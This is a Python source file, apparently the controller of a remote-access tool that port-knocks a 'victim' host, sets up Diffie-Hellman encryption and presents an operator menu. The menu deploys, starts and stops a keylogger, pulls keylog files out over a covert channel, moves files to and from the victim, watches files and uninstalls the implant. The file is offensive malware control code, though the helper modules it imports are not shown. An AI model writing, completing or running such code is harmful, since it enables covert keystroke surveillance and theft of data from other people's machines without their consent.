import select
from commander_utils import *
from commander_cryptography import *
from port_knocking import *

if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Perform port knocking
    print_config(destination_ip, destination_port, (source_ip, source_port))
    perform_port_knocking(destination_ip, destination_port)

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)

    # Perform Diffie-Hellman Key Exchange (for encryption/decryption)
    private_key, public_key, shared_secret = perform_diffie_hellman(victim_socket)

    # Initialize a Global Thread and Queue (for multipurpose)
    global_thread = None
    signal_queue = queue.Queue()

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                process_new_connections(server_socket, sockets_to_read, connected_clients)

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                command = get_user_menu_option(sys.stdin)

                # MENU ITEM 1 - Start Keylogger
                if command == constants.PERFORM_MENU_ITEM_ONE:
                    perform_menu_item_1(connected_clients, shared_secret)

                # MENU ITEM 2 - Stop Keylogger
                if command == constants.PERFORM_MENU_ITEM_TWO:
                    perform_menu_item_2(connected_clients, shared_secret)

                # MENU ITEM 3 - Transfer keylog program to victim
                if command == constants.PERFORM_MENU_ITEM_THREE:
                    perform_menu_item_3(connected_clients, shared_secret)

                # MENU ITEM 4 - Get Keylog File(s) from Victim (via. covert channel)
                if command == constants.PERFORM_MENU_ITEM_FOUR:
                    perform_menu_item_4(connected_clients, source_ip, source_port, shared_secret)

                # MENU ITEM 5 - Disconnect from victim
                if command == constants.PERFORM_MENU_ITEM_FIVE:
                    disconnect_from_client(sockets_to_read, connected_clients)

                # MENU ITEM 6 - Transfer a file to victim
                if command == constants.PERFORM_MENU_ITEM_SIX:
                    perform_menu_item_6(connected_clients, source_ip, source_port, shared_secret)

                # MENU ITEM 7 - Get File from Victim
                if command == constants.PERFORM_MENU_ITEM_SEVEN:
                    perform_menu_item_7(connected_clients, source_ip, source_port, shared_secret)

                # MENU ITEM 9 - Watch File
                if command == constants.PERFORM_MENU_ITEM_NINE:
                    global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue, shared_secret)

                # MENU ITEM 10 - Watch Directory [PENDING IMPLEMENTATION]

                # MENU ITEM 11 - Stop Watching File
                if command == constants.PERFORM_MENU_ITEM_ELEVEN:
                    global_thread = perform_menu_item_11(connected_clients, global_thread, signal_queue)

                # MENU ITEM 12 - Connect to a specific victim
                if command == constants.PERFORM_MENU_ITEM_FOURTEEN:
                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                             connected_clients)

                # MENU ITEM 15 - Uninstall
                if command == constants.PERFORM_MENU_ITEM_FIFTEEN:
                    perform_menu_item_15(sockets_to_read, connected_clients, shared_secret)
